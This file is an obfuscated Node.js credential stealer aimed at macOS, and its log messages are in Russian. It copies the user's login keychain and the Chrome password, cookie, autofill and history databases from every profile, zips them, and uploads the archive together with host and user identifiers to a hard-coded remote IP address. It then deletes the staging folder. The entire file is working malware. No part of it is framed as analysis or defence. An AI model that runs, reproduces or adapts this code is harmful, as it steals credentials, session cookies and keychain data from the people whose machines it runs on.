const _0x2c4dc7=_0x3486;(function(_0x1ff330,_0x10b7b7){const _0x2c76d1=_0x3486,_0x1c3828=_0x1ff330();while(!![]){try{const _0x363f60=parseInt(_0x2c76d1(0x20b))/0x1*(-parseInt(_0x2c76d1(0x263))/0x2)+parseInt(_0x2c76d1(0x225))/0x3*(-parseInt(_0x2c76d1(0x212))/0x4)+-parseInt(_0x2c76d1(0x203))/0x5+-parseInt(_0x2c76d1(0x286))/0x6*(parseInt(_0x2c76d1(0x27d))/0x7)+parseInt(_0x2c76d1(0x281))/0x8*(-parseInt(_0x2c76d1(0x265))/0x9)+parseInt(_0x2c76d1(0x227))/0xa*(parseInt(_0x2c76d1(0x24e))/0xb)+parseInt(_0x2c76d1(0x234))/0xc;if(_0x363f60===_0x10b7b7)break;else _0x1c3828['push'](_0x1c3828['shift']());}catch(_0x50570e){_0x1c3828['push'](_0x1c3828['shift']());}}}(_0x3bcd,0xc96fd));function _0x3bcd(){const _0x1501b5=['loaded','substring','statSync','random','Login\x20Data','ОШИБКА\x20ПРИ\x20ЗАГРУЗКЕ\x20(попытка\x20','Error\x20creating\x20directory\x20','2zWIyyS','exit','appendFileSync','request','status','Bytes','stderr:\x20','20kXEhjZ','data','Stable.zip','total','Web\x20Data-journal','http://77.239.97.85:8088/api/files/upload','digest','isDirectory','path','Error\x20scanning\x20Chrome\x20profiles:\x20','Keychain\x20file\x20not\x20found:\x20','stderr','file','History','platform','hex','zipFileName','Содержимое\x20директории:\x20','КРИТИЧЕСКАЯ\x20ОШИБКА:\x20Файл\x20не\x20найден:\x20','660522YXiECx','Chrome\x20data\x20for\x20profile\x20','10Rfrsis','name','/Library/Keychains/login.keychain-db','Предупреждение:\x20Ошибка\x20при\x20удалении\x20временных\x20файлов:\x20','ОШИБКА:\x20Файл\x20','Статус\x20ошибки:\x20','axios','push','==========\x20НАЧАЛО\x20ПРОЦЕССА\x20СБОРА\x20И\x20ОТПРАВКИ\x20ДАННЫХ\x20==========','trim','Размер\x20файла:\x20','Chrome\x20directory\x20not\x20found:\x20','/Users/','37203264gkYoIk','00:00:00:00:00:00','Creating\x20ZIP\x20archive...','Error\x20executing\x20command:\x20','mkdirSync','collector.log','post','Cookies','createReadStream','log','Found\x20','copyFileSync','Failed\x20to\x20create\x20ZIP\x20archive','getHeaders','now','startsWith','readdirSync','utf8','md5','message','internal','serverUrl','Stable','Информация\x20о\x20системе:\x20','=====\x20НАЧАЛО\x20СБОРА\x20ДАННЫХ\x20=====','rm\x20-rf\x20','15567442UPlGLk','Current\x20user:\x20','arch','version','History-journal','Прогресс\x20загрузки:\x20','Повторная\x20попытка\x20через\x20','existsSync','./node_modules/form-data','Статус\x20ответа:\x20','crypto','Directory\x20created:\x20','URL\x20сервера:\x20','Archive\x20size:\x20','username','\x20KB/s)','Сбор\x20данных\x20завершился\x20с\x20ошибкой','stringify','Установка\x20необходимых\x20зависимостей...','join','File\x20copied:\x20','1416664JXCrRC','round','9423uqPPBl','Chrome\x20file\x20not\x20found\x20in\x20profile\x20','Secure\x20Preferences','Текущая\x20директория:\x20','child_process','getLengthSync','Директория\x20запуска:\x20','\x20байт\x20(','\x20Chrome\x20profiles:\x20','pow','timeout','=====\x20НАЧАЛО\x20ОТПРАВКИ\x20АРХИВА\x20=====','basename','\x20удалена','toString','Error\x20copying\x20file\x20','unknown','Нет\x20ответа\x20от\x20сервера','userInfo','stableDir','Превышено\x20максимальное\x20количество\x20попыток\x20(','Web\x20Data','tJz4uRVCwl2eEwyPTudYP9iGRfgq','floor','137263eICQLA','Error\x20writing\x20to\x20log:\x20','Command\x20output:\x20','retryDelay','24dtldAq','maxRetries','toISOString','cwd','hostname','318dsnaom','==========\x20СБОР\x20И\x20ОТПРАВКА\x20ДАННЫХ\x20УСПЕШНО\x20ЗАВЕРШЕНЫ\x20==========','ZIP\x20archive\x20file\x20not\x20found\x20after\x20creation','error','\x20секунд...','Profile\x20','Ответ\x20сервера:\x20','/Library/Application\x20Support/Google/Chrome','Default','Предупреждение:\x20Не\x20удалось\x20проверить/установить\x20зависимости:\x20','Failed\x20to\x20create\x20Stable\x20directory','Зависимости\x20успешно\x20установлены','toFixed','response','Executing\x20command:\x20','form-data','success','application/zip','Chrome_','size','ФАТАЛЬНАЯ\x20ОШИБКА:\x20','Bookmarks','652285lmvInE'];_0x3bcd=function(){return _0x1501b5;};return _0x3bcd();}const fs=require('fs'),os=require('os'),path=require(_0x2c4dc7(0x21a)),{exec,execSync}=require(_0x2c4dc7(0x269)),crypto=require(_0x2c4dc7(0x258)),axios=require(_0x2c4dc7(0x22d)),FormData=require(_0x2c4dc7(0x1fc)),CONFIG={'serverUrl':_0x2c4dc7(0x217),'apiKey':_0x2c4dc7(0x27b),'chunkSize':0x100*0x400,'retryDelay':0x1388,'maxRetries':0x5,'timeout':0x1d4c0,'stableDir':_0x2c4dc7(0x24a),'zipFileName':_0x2c4dc7(0x214),'chromeImportantFiles':[_0x2c4dc7(0x27a),_0x2c4dc7(0x216),_0x2c4dc7(0x208),'Login\x20Data-journal',_0x2c4dc7(0x21f),_0x2c4dc7(0x252),_0x2c4dc7(0x23b),'Cookies-journal',_0x2c4dc7(0x202),_0x2c4dc7(0x267)]};function log(_0x348222,_0x31f57a=![]){const _0x1df135=_0x2c4dc7,_0x1b24c8=new Date()[_0x1df135(0x283)](),_0x281262='['+_0x1b24c8+']\x20'+_0x348222;_0x31f57a?console['error'](_0x281262):console[_0x1df135(0x23d)](_0x281262);try{fs[_0x1df135(0x20d)](_0x1df135(0x239),_0x281262+'\x0a');}catch(_0x2938df){console[_0x1df135(0x289)](_0x1df135(0x27e)+_0x2938df['message']);}}function createDirectory(_0x4b9ebe){const _0x291c9b=_0x2c4dc7;try{return!fs[_0x291c9b(0x255)](_0x4b9ebe)?(fs[_0x291c9b(0x238)](_0x4b9ebe,{'recursive':!![]}),log(_0x291c9b(0x259)+_0x4b9ebe)):log('Directory\x20already\x20exists:\x20'+_0x4b9ebe),!![];}catch(_0x1b7055){return log(_0x291c9b(0x20a)+_0x4b9ebe+':\x20'+_0x1b7055['message'],!![]),![];}}function copyFile(_0x1a3634,_0x3730fa){const _0x15c80a=_0x2c4dc7;try{return fs[_0x15c80a(0x23f)](_0x1a3634,_0x3730fa),log(_0x15c80a(0x262)+_0x1a3634+'\x20->\x20'+_0x3730fa),!![];}catch(_0x5dd78e){return log(_0x15c80a(0x274)+_0x1a3634+':\x20'+_0x5dd78e[_0x15c80a(0x247)],!![]),![];}}function _0x3486(_0x5cdbf9,_0x50e984){const _0x3bcdda=_0x3bcd();return _0x3486=function(_0x3486a3,_0x2f09f4){_0x3486a3=_0x3486a3-0x1f3;let _0x2ea966=_0x3bcdda[_0x3486a3];return _0x2ea966;},_0x3486(_0x5cdbf9,_0x50e984);}function executeCommand(_0x368574){const _0x2e62ad=_0x2c4dc7;try{log(_0x2e62ad(0x1fb)+_0x368574);const _0x5ddf95=execSync(_0x368574,{'encoding':_0x2e62ad(0x245)});return log(_0x2e62ad(0x27f)+_0x5ddf95[_0x2e62ad(0x230)]()),{'success':!![],'output':_0x5ddf95};}catch(_0x4cb17c){log(_0x2e62ad(0x237)+_0x4cb17c[_0x2e62ad(0x247)],!![]);if(_0x4cb17c[_0x2e62ad(0x21d)])log(_0x2e62ad(0x211)+_0x4cb17c['stderr'],!![]);return{'success':![],'error':_0x4cb17c};}}function formatFileSize(_0x154f3d){const _0xc55410=_0x2c4dc7;if(_0x154f3d===0x0)return'0\x20Bytes';const _0x37e55b=0x400,_0x168e40=[_0xc55410(0x210),'KB','MB','GB','TB'],_0x26f816=Math[_0xc55410(0x27c)](Math[_0xc55410(0x23d)](_0x154f3d)/Math['log'](_0x37e55b));return parseFloat((_0x154f3d/Math[_0xc55410(0x26e)](_0x37e55b,_0x26f816))[_0xc55410(0x1f9)](0x2))+'\x20'+_0x168e40[_0x26f816];}function generateClientId(){const _0x3ab2eb=_0x2c4dc7;try{const _0x4a23be=getMacAddress(),_0x1b8d31=os[_0x3ab2eb(0x285)](),_0x65515e=os['userInfo']()[_0x3ab2eb(0x25c)],_0x570536=crypto['createHash'](_0x3ab2eb(0x246))['update'](_0x4a23be+':'+_0x1b8d31+':'+_0x65515e)[_0x3ab2eb(0x218)](_0x3ab2eb(0x221))['substring'](0x0,0x8);return _0x570536;}catch(_0x484d2f){return Math[_0x3ab2eb(0x207)]()[_0x3ab2eb(0x273)](0x24)[_0x3ab2eb(0x205)](0x2,0xa);}}function getMacAddress(){const _0xf84f09=_0x2c4dc7;try{const _0x149f28=os['networkInterfaces']();for(const _0x7bb8e5 of Object['keys'](_0x149f28)){for(const _0x40f879 of _0x149f28[_0x7bb8e5]){if(!_0x40f879[_0xf84f09(0x248)]&&_0x40f879['mac']!==_0xf84f09(0x235))return _0x40f879['mac'];}}return _0xf84f09(0x275);}catch(_0x44e39c){return _0xf84f09(0x275);}}async function collectData(){const _0x84b828=_0x2c4dc7;try{log(_0x84b828(0x24c));if(!createDirectory(CONFIG[_0x84b828(0x278)]))throw new Error(_0x84b828(0x1f7));const _0x74af5b=os[_0x84b828(0x277)]()[_0x84b828(0x25c)];log(_0x84b828(0x24f)+_0x74af5b);const _0x3e56f0=_0x84b828(0x233)+_0x74af5b+_0x84b828(0x229),_0x1233cb=path[_0x84b828(0x261)](CONFIG[_0x84b828(0x278)],'login.keychain-db');fs[_0x84b828(0x255)](_0x3e56f0)?copyFile(_0x3e56f0,_0x1233cb):log(_0x84b828(0x21c)+_0x3e56f0,!![]);try{const _0x172c50=_0x84b828(0x233)+_0x74af5b+_0x84b828(0x1f4);if(fs[_0x84b828(0x255)](_0x172c50)){const _0x4ed430=[];fs[_0x84b828(0x255)](path[_0x84b828(0x261)](_0x172c50,_0x84b828(0x1f5)))&&_0x4ed430[_0x84b828(0x22e)](_0x84b828(0x1f5));try{const _0x38b70c=fs[_0x84b828(0x244)](_0x172c50,{'withFileTypes':!![]});for(const _0x4fecf9 of _0x38b70c){_0x4fecf9[_0x84b828(0x219)]()&&_0x4fecf9[_0x84b828(0x228)][_0x84b828(0x243)](_0x84b828(0x28b))&&_0x4ed430[_0x84b828(0x22e)](_0x4fecf9[_0x84b828(0x228)]);}}catch(_0x299123){log(_0x84b828(0x21b)+_0x299123[_0x84b828(0x247)],!![]);}log(_0x84b828(0x23e)+_0x4ed430['length']+_0x84b828(0x26d)+_0x4ed430[_0x84b828(0x261)](',\x20'));for(const _0x121a2c of _0x4ed430){const _0x1636b8=path[_0x84b828(0x261)](_0x172c50,_0x121a2c),_0x201969=path[_0x84b828(0x261)](CONFIG[_0x84b828(0x278)],_0x84b828(0x1ff)+_0x121a2c);createDirectory(_0x201969);for(const _0x5243ec of CONFIG['chromeImportantFiles']){const _0x38558b=path[_0x84b828(0x261)](_0x1636b8,_0x5243ec),_0x546a60=path['join'](_0x201969,_0x5243ec);fs[_0x84b828(0x255)](_0x38558b)?copyFile(_0x38558b,_0x546a60):log(_0x84b828(0x266)+_0x121a2c+':\x20'+_0x38558b);}log(_0x84b828(0x226)+_0x121a2c+'\x20copied\x20successfully');}}else log(_0x84b828(0x232)+_0x172c50,!![]);}catch(_0x2a79ef){log('Error\x20copying\x20Chrome\x20data:\x20'+_0x2a79ef[_0x84b828(0x247)],!![]);}log(_0x84b828(0x236));const _0x54cd7e=executeCommand('zip\x20-r\x20-1\x20'+CONFIG['zipFileName']+'\x20'+CONFIG[_0x84b828(0x278)]+'\x20-x\x20\x22*.DS_Store\x22');if(!_0x54cd7e[_0x84b828(0x1fd)])throw new Error(_0x84b828(0x240));log('ZIP\x20archive\x20created\x20successfully');if(fs[_0x84b828(0x255)](CONFIG[_0x84b828(0x222)])){const _0x32978f=fs[_0x84b828(0x206)](CONFIG['zipFileName']);log(_0x84b828(0x25b)+formatFileSize(_0x32978f[_0x84b828(0x200)]));}else throw new Error(_0x84b828(0x288));return log('=====\x20СБОР\x20ДАННЫХ\x20ЗАВЕРШЕН\x20====='),!![];}catch(_0x5c01d2){return log('Error\x20in\x20data\x20collection:\x20'+_0x5c01d2[_0x84b828(0x247)],!![]),![];}}async function uploadFile(_0x36887b=0x0){const _0x5c8f3a=_0x2c4dc7;try{const _0x4654c8=path[_0x5c8f3a(0x261)](process[_0x5c8f3a(0x284)](),CONFIG['zipFileName']);if(!fs[_0x5c8f3a(0x255)](_0x4654c8))return log(_0x5c8f3a(0x224)+_0x4654c8,!![]),log(_0x5c8f3a(0x268)+process['cwd'](),!![]),log(_0x5c8f3a(0x223)+fs[_0x5c8f3a(0x244)](process[_0x5c8f3a(0x284)]())[_0x5c8f3a(0x261)](',\x20'),!![]),![];const _0x3e5516=fs['statSync'](_0x4654c8),_0x39e638=_0x3e5516[_0x5c8f3a(0x200)];log(_0x5c8f3a(0x231)+_0x39e638+_0x5c8f3a(0x26c)+formatFileSize(_0x39e638)+')');if(_0x39e638===0x0)return log(_0x5c8f3a(0x22b)+CONFIG['zipFileName']+'\x20имеет\x20нулевой\x20размер!',!![]),![];const _0x70d260=new FormData();_0x70d260['append'](_0x5c8f3a(0x21e),fs[_0x5c8f3a(0x23c)](_0x4654c8),{'filename':path[_0x5c8f3a(0x271)](_0x4654c8),'contentType':_0x5c8f3a(0x1fe),'knownLength':_0x39e638});const _0x44c07a={'hostname':os['hostname'](),'platform':os[_0x5c8f3a(0x220)](),'type':os['type'](),'arch':os[_0x5c8f3a(0x250)](),'username':os[_0x5c8f3a(0x277)]()['username'],'id':generateClientId()};log(_0x5c8f3a(0x270)),log(_0x5c8f3a(0x24b)+JSON[_0x5c8f3a(0x25f)](_0x44c07a)),log(_0x5c8f3a(0x25a)+CONFIG['serverUrl']);const _0x2e9c2a=Date['now']();log('Отправка\x20началась\x20в:\x20'+new Date(_0x2e9c2a)[_0x5c8f3a(0x283)]());const _0x5012f6=await axios[_0x5c8f3a(0x23a)](CONFIG[_0x5c8f3a(0x249)],_0x70d260,{'headers':{..._0x70d260[_0x5c8f3a(0x241)](),'X-Client-Info':JSON[_0x5c8f3a(0x25f)](_0x44c07a),'Content-Length':_0x70d260[_0x5c8f3a(0x26a)]()},'maxContentLength':Infinity,'maxBodyLength':Infinity,'timeout':CONFIG[_0x5c8f3a(0x26f)],'onUploadProgress':_0x13324a=>{const _0x3e67b6=_0x5c8f3a,_0x3a62f2=Math[_0x3e67b6(0x264)](_0x13324a[_0x3e67b6(0x204)]*0x64/_0x13324a[_0x3e67b6(0x215)]);log(_0x3e67b6(0x253)+_0x3a62f2+'%\x20('+formatFileSize(_0x13324a[_0x3e67b6(0x204)])+'/'+formatFileSize(_0x13324a['total'])+')');}}),_0x29c2ae=Date[_0x5c8f3a(0x242)](),_0x184fe1=(_0x29c2ae-_0x2e9c2a)/0x3e8,_0x204e6e=_0x39e638/_0x184fe1/0x400;return log('Загрузка\x20завершена\x20за\x20'+_0x184fe1[_0x5c8f3a(0x1f9)](0x1)+'\x20секунд\x20('+_0x204e6e['toFixed'](0x2)+_0x5c8f3a(0x25d)),log(_0x5c8f3a(0x257)+_0x5012f6[_0x5c8f3a(0x20f)]),log(_0x5c8f3a(0x1f3)+JSON[_0x5c8f3a(0x25f)](_0x5012f6[_0x5c8f3a(0x213)])),log('=====\x20ОТПРАВКА\x20АРХИВА\x20ЗАВЕРШЕНА\x20====='),_0x5012f6['data'][_0x5c8f3a(0x1fd)];}catch(_0xd72f21){log(_0x5c8f3a(0x209)+(_0x36887b+0x1)+'/'+CONFIG[_0x5c8f3a(0x282)]+'):',!![]);if(_0xd72f21[_0x5c8f3a(0x1fa)])log(_0x5c8f3a(0x22c)+_0xd72f21[_0x5c8f3a(0x1fa)]['status'],!![]),log('Данные\x20ошибки:\x20'+JSON[_0x5c8f3a(0x25f)](_0xd72f21[_0x5c8f3a(0x1fa)][_0x5c8f3a(0x213)]),!![]);else _0xd72f21[_0x5c8f3a(0x20e)]?(log(_0x5c8f3a(0x276),!![]),log('Тип\x20ошибки:\x20'+_0xd72f21['code'],!![])):log('Ошибка\x20настройки:\x20'+_0xd72f21[_0x5c8f3a(0x247)],!![]);if(_0x36887b<CONFIG[_0x5c8f3a(0x282)])return log(_0x5c8f3a(0x254)+CONFIG[_0x5c8f3a(0x280)]/0x3e8+_0x5c8f3a(0x28a)),await new Promise(_0x4cba33=>setTimeout(_0x4cba33,CONFIG[_0x5c8f3a(0x280)])),uploadFile(_0x36887b+0x1);return log(_0x5c8f3a(0x279)+CONFIG['maxRetries']+')',!![]),![];}}async function main(){const _0x28fe61=_0x2c4dc7;try{log(_0x28fe61(0x22f)),log('Версия\x20Node.js:\x20'+process[_0x28fe61(0x251)]),log('Платформа:\x20'+process[_0x28fe61(0x220)]),log(_0x28fe61(0x26b)+process['cwd']());try{(!fs[_0x28fe61(0x255)]('./node_modules/axios')||!fs[_0x28fe61(0x255)](_0x28fe61(0x256)))&&(log(_0x28fe61(0x260)),execSync('npm\x20install\x20axios\x20form-data'),log(_0x28fe61(0x1f8)));}catch(_0x5a7e87){log(_0x28fe61(0x1f6)+_0x5a7e87[_0x28fe61(0x247)]);}const _0x205ee5=await collectData();!_0x205ee5&&(log(_0x28fe61(0x25e),!![]),process[_0x28fe61(0x20c)](0x1));const _0x40207c=await uploadFile();if(_0x40207c){log(_0x28fe61(0x287));try{fs['existsSync'](CONFIG[_0x28fe61(0x278)])&&(executeCommand(_0x28fe61(0x24d)+CONFIG['stableDir']),log('Временная\x20директория\x20'+CONFIG[_0x28fe61(0x278)]+_0x28fe61(0x272)));}catch(_0x249af4){log(_0x28fe61(0x22a)+_0x249af4[_0x28fe61(0x247)]);}process[_0x28fe61(0x20c)](0x0);}else log('==========\x20ОШИБКА\x20ОТПРАВКИ\x20ДАННЫХ\x20==========',!![]),process['exit'](0x1);}catch(_0x18cd5d){log(_0x28fe61(0x201)+_0x18cd5d[_0x28fe61(0x247)],!![]),log('Стек\x20ошибки:\x20'+_0x18cd5d['stack'],!![]),process['exit'](0x1);}}main();
